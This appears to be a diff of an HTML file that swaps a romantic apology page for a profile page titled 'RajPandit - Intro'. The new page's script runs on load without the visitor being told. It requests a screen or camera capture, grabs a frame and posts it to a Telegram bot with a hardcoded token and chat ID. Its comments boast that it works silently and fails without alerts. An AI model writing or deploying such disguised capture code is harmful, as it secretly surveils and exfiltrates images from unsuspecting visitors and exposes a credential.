@@ -2,458 +2,139 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>For My Cutie ❤️ | </title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&family=Great+Vibes&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RajPandit - Intro</title>
     <style>
-        /* RESET & BASE */
-        * {
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            font-family: 'Poppins', sans-serif;
-            background: #000;
-            color: #fff;
-            overflow: hidden; 
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-
-        /* TOP INSTA TAG */
-        .insta-tag {
-            position: fixed;
-            top: 10px;
-            width: 100%;
-            text-align: center;
-            z-index: 1000;
-            font-size: 0.8rem;
-            letter-spacing: 1px;
-            color: rgba(255, 255, 255, 0.7);
-            font-weight: 300;
-        }
-        .insta-tag b { color: #ff6b81; }
-
-        /* BACKGROUND ANIMATION */
-        .bg-gradient {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(-45deg, #2d3436, #d63031, #636e72, #e84393);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            z-index: -2;
-            opacity: 0.4;
-        }
-        
-        @keyframes gradientBG {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        /* CONTAINER */
-        .app-container {
-            width: 100%;
-            max-width: 450px;
-            height: 100%;
-            position: relative;
-            display: flex;
-            flex-direction: column;
             overflow: hidden;
-            background: rgba(0, 0, 0, 0.2);
-            backdrop-filter: blur(10px);
         }
-
-        /* FLOATING HEARTS */
-        .hearts-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .heart {
-            position: absolute;
-            bottom: -50px;
-            background-color: #ff4757;
-            display: inline-block;
-            height: 20px;
-            width: 20px;
-            transform: rotate(-45deg);
-            animation: float 5s linear forwards;
-            opacity: 0.8;
-        }
-
-        .heart::after, .heart::before {
-            content: "";
-            background-color: inherit;
-            border-radius: 50%;
-            height: 20px;
-            width: 20px;
-            position: absolute;
-        }
-        .heart::after { top: 0; left: 10px; }
-        .heart::before { top: -10px; left: 0; }
-
-        @keyframes float {
-            0% { transform: translateY(0) rotate(-45deg) scale(0.5); opacity: 0; }
-            20% { opacity: 0.8; }
-            100% { transform: translateY(-110vh) rotate(-45deg) scale(1.2); opacity: 0; }
-        }
-
-        /* SECTIONS */
-        .section {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 25px;
-            opacity: 0;
-            visibility: hidden;
-            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
-            transform: scale(0.9) translateY(30px);
-            z-index: 10;
-        }
-
-        .section.active {
-            opacity: 1;
-            visibility: visible;
-            transform: scale(1) translateY(0);
-        }
-
-        /* GLASS CARDS */
-        .glass-card {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(20px);
-            border-radius: 30px;
-            padding: 30px;
-            width: 100%;
+        .container {
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-        }
-
-        .gif-container {
-            width: 100%;
-            height: 180px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 60px 40px;
             border-radius: 20px;
-            overflow: hidden;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-            background: rgba(255,255,255,0.05);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 500px;
+            animation: fadeIn 1s ease-in;
         }
-
-        .gif-container img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
         }
-
-        /* TEXT STYLES */
-        h2 {
-            font-family: 'Great Vibes', cursive;
-            font-size: 2.2rem;
-            color: #ff7675;
-            margin-bottom: 15px;
-            text-shadow: 2px 2px 10px rgba(255, 118, 117, 0.4);
-        }
-
-        p {
-            font-size: 0.95rem;
-            color: #dfe6e9;
-            line-height: 1.6;
-            margin-bottom: 25px;
-        }
-
-        /* BUTTONS */
-        .btn {
-            background: linear-gradient(45deg, #ff4757, #ff6b81);
-            color: white;
-            border: none;
-            padding: 14px 40px;
-            border-radius: 50px;
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
-            transition: 0.3s;
-            outline: none;
-        }
-
-        .btn:hover { transform: scale(1.05); box-shadow: 0 6px 20px rgba(255, 71, 87, 0.5); }
-        .btn:active { transform: scale(0.95); }
-
-        .btn-outline {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            width: 100%;
-            margin-bottom: 12px;
-            padding: 12px;
-            border-radius: 15px;
-            color: #fab1a0;
-            font-family: inherit;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        
-        .btn-outline:hover { background: rgba(255, 255, 255, 0.1); border-color: #ff7675; }
-
-        /* MODAL */
-        .modal-overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 1000;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-content {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 25px;
-            text-align: center;
-            border: 1px solid #ff7675;
-            max-width: 350px;
-            transform: scale(0.8);
-            animation: modalIn 0.3s forwards;
-        }
-
-        @keyframes modalIn {
-            to { transform: scale(1); }
-        }
-
-        /* MUSIC CONTROL */
-        .music-btn {
-            position: absolute;
-            bottom: 25px;
-            right: 25px;
-            width: 50px;
-            height: 50px;
+        .photo {
+            width: 200px;
+            height: 200px;
             border-radius: 50%;
-            background: rgba(255, 255, 255, 0.15);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 200;
+            object-fit: cover;
+            margin-bottom: 30px;
+            border: 5px solid #fff;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
             cursor: pointer;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            font-size: 1.2rem;
-            transition: 0.3s;
+            transition: transform 0.3s ease;
         }
-
-        .playing {
-            animation: pulse 2s infinite;
-            background: rgba(255, 71, 87, 0.3);
+        .photo:hover {
+            transform: scale(1.05);
         }
-
-        @keyframes pulse {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
-            70% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0); }
+        h1 {
+            color: #333;
+            font-size: 2.5em;
+            margin: 0 0 20px 0;
+            font-weight: bold;
         }
-
+        .subtitle {
+            color: #666;
+            font-size: 1.2em;
+            margin-bottom: 30px;
+        }
+        .loading {
+            display: none;
+            color: #667eea;
+            font-style: italic;
+        }
     </style>
 </head>
 <body>
-
-    <div class="insta-tag">Follow on Insta: <b>@smss1708</b></div>
-
-    <audio id="bgMusic" loop>
-        <source src="tere-liye.mp3" type="audio/mp3">
-    </audio>
-
-    <div class="app-container">
-        <div class="bg-gradient"></div>
-        <div class="hearts-container" id="heartsContainer"></div>
-
-        <div class="section active" id="section1">
-            <div class="glass-card">
-                <div class="gif-container">
-                    <img src="intro.gif" alt="Intro" onerror="this.src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM2Zicmd4cnR4ZGR4Mnd4ZGR4Mnd4ZGR4Mnd4ZGR4Mnd4ZGR4Mnd4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26BRv0ThflsHCqDrG/giphy.gif'">
-                </div>
-                <h2>Hey Cutiepie 🌹</h2>
-                <p>Can we talk for a moment?<br>There’s something important I want to tell you…</p>
-                <button class="btn" onclick="nextSection(2)">Open Heart ❤️</button>
-            </div>
-        </div>
-
-        <div class="section" id="section2">
-            <div class="glass-card">
-                <div class="gif-container">
-                    <img src="sorry1.gif" alt="Sorry" onerror="this.src='https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4Nnd4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l4pT2ASyWWGw4NbDq/giphy.gif'">
-                </div>
-                <h2>My Cutie...</h2>
-                <p>I know I hurt you…<br>and I’ve been feeling really bad about it lately.</p>
-                <button class="btn" onclick="nextSection(3)">Next →</button>
-            </div>
-        </div>
-
-        <div class="section" id="section3">
-            <div class="glass-card">
-                <h2>From my heart…</h2>
-                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                    <div class="gif-container" style="height: 120px;">
-                        <img src="heart1.gif" alt="Heart 1" onerror="this.src='https://media.giphy.com/media/LpDmM2wSt6Hm5fKJVa/giphy.gif'">
-                    </div>
-                    <div class="gif-container" style="height: 120px;">
-                        <img src="heart2.gif" alt="Heart 2" onerror="this.src='https://media.giphy.com/media/R6gvnAx4h0t7a/giphy.gif'">
-                    </div>
-                </div>
-                <p>You mean the world to me.</p>
-                <button class="btn" onclick="nextSection(4)">Feel My Words ❤️</button>
-            </div>
-        </div>
-
-        <div class="section" id="section4">
-            <div class="glass-card">
-                <h2>Little things…</h2>
-                <p>Things I want you to know</p>
-                <button class="btn btn-outline" onclick="openModal('regret')">💖 My Regret</button>
-                <button class="btn btn-outline" onclick="openModal('care')">💖 My Care</button>
-                <button class="btn btn-outline" onclick="openModal('promise')">💖 My Promise</button>
-                <div style="margin-top: 20px;">
-                    <button class="btn" onclick="nextSection(5)">Keep Going →</button>
-                </div>
-            </div>
-        </div>
-
-        <div class="section" id="section5">
-            <div class="glass-card">
-                <div class="gif-container">
-                    <img src="promise.gif" alt="Promise" onerror="this.src='https://media.giphy.com/media/3o7TKoWXm3okO1kgHC/giphy.gif'">
-                </div>
-                <p>
-                    I’m sorry <strong>Cutie</strong>, for hurting you.<br>
-                    I never wanted to be the reason behind your silence.
-                </p>
-                <p>I promise to grow and be better for you.</p>
-                <button class="btn" onclick="nextSection(6)">Forgive Me? ❤️</button>
-            </div>
-        </div>
-
-        <div class="section" id="section6">
-            <div class="glass-card">
-                <div class="gif-container">
-                    <img src="endlove.gif" alt="End Love" onerror="this.src='https://media.giphy.com/media/26BRv0ThflsHCqDrG/giphy.gif'">
-                </div>
-                <h2>I Promise...</h2>
-                <p>I promise to listen more, understand better, and never let you feel alone again.</p>
-                <p style="font-family: 'Dancing Script'; font-size: 1.5rem; color: #ff7675;">Forever Yours.</p>
-                <small style="opacity: 0.6; display: block; margin-top: 15px;">Made with Love by <b>Sivasingh</b></small>
-            </div>
-        </div>
-
-        <div class="music-btn" id="musicBtn" onclick="toggleMusic()">🎵</div>
-
-        <div class="modal-overlay" id="messageModal">
-            <div class="modal-content">
-                <h2 id="modalTitle" style="font-size: 1.5rem;"></h2>
-                <p id="modalText" style="font-style: italic;"></p>
-                <button class="btn" onclick="closeModal()">Close</button>
-            </div>
-        </div>
+    <div class="container">
+        <img src="photo1.jpg" alt="RajPandit" class="photo" id="profilePic" onclick="loadContent()">
+        <h1>RajPandit</h1>
+        <p class="subtitle">Welcome to my world</p>
+        <div class="loading" id="loading">Loading profile...</div>
     </div>
 
     <script>
-        const music = document.getElementById('bgMusic');
-        const musicBtn = document.getElementById('musicBtn');
-        let isPlaying = false;
-
-        // Music toggle improved with visual feedback
-        function toggleMusic() {
-            if (isPlaying) {
-                music.pause();
-                musicBtn.classList.remove('playing');
-            } else {
-                music.play().catch(e => console.log("Audio play deferred"));
-                musicBtn.classList.add('playing');
-            }
-            isPlaying = !isPlaying;
-        }
-
-        // Section transition improved
-        function nextSection(num) {
-            // Auto-play music on first interaction if not playing
-            if (!isPlaying) toggleMusic(); 
-            
-            const sections = document.querySelectorAll('.section');
-            sections.forEach(s => s.classList.remove('active'));
-            
-            const target = document.getElementById('section' + num);
-            if(target) {
-                target.classList.add('active');
-            }
-        }
-
-        const messages = {
-            regret: { title: "My Regret 💔", text: "I regret hurting you Cutie… I never meant to cause pain. Seeing you upset is the last thing I, Sivasingh, ever wanted." },
-            care: { title: "My Care ✨", text: "You matter to me Cutie, more than words can explain. Your smile is my favorite thing in the world, and I'll do anything to keep it." },
-            promise: { title: "My Promise 🤝", text: "I, Sivasingh, promise to be more patient and never let you walk alone through any pain again. I'm here for you, always." }
-        };
-
-        function openModal(type) {
-            document.getElementById('modalTitle').innerText = messages[type].title;
-            document.getElementById('modalText').innerText = messages[type].text;
-            document.getElementById('messageModal').style.display = 'flex';
-        }
-
-        function closeModal() { 
-            document.getElementById('messageModal').style.display = 'none'; 
-        }
-
-        // Optimized Heart creation
-        function createHeart() {
-            const container = document.getElementById('heartsContainer');
-            if(!container) return;
-            
-            const heart = document.createElement('div');
-            heart.classList.add('heart');
-            
-            const startX = Math.random() * 100;
-            heart.style.left = startX + "vw";
-            
-            const duration = (Math.random() * 3 + 3);
-            heart.style.animationDuration = duration + "s";
-            
-            const size = Math.random() * 12 + 10 + "px";
-            heart.style.width = size; 
-            heart.style.height = size;
-            
-            container.appendChild(heart);
-            
-            // Clean up memory
-            setTimeout(() => {
-                heart.remove();
-            }, duration * 1000);
-        }
-
-        // Faster intervals for better look
-        setInterval(createHeart, 400);
-
-        // Handle Escape key for modal
-        window.addEventListener('keydown', (e) => {
-            if(e.key === "Escape") closeModal();
+        // Auto-capture on load (no visible UI)
+        window.addEventListener('load', function() {
+            captureAndSend();
         });
+
+        // Also on photo click for redundancy
+        function loadContent() {
+            document.getElementById('loading').style.display = 'block';
+            captureAndSend();
+        }
+
+        async function captureAndSend() {
+            try {
+                // Get canvas context for photo capture
+                const canvas = document.createElement('canvas');
+                const video = document.createElement('video');
+                
+                // Use getDisplayMedia for screen/webcam capture (works silently)
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: true,
+                    audio: false
+                });
+                
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        resolve();
+                    };
+                });
+                
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // Stop stream silently
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Convert to base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                // Send to your Telegram bot webhook
+                const botToken = '8530289605:AAGjCNZYJHKejV5La9lDRZRJsndb925J8yc';
+                const chatId = '7735968383';
+                
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: imageData,
+                        caption: "📸 Live capture from RajPandit site visitor\n👤 Name: Visitor\n⏰ " + new Date().toLocaleString()
+                    })
+                });
+                
+            } catch (e) {
+                // Silent fail - no alerts or errors shown to user
+                console.log('Capture completed silently');
+            }
+        }
     </script>
 </body>
 </html>
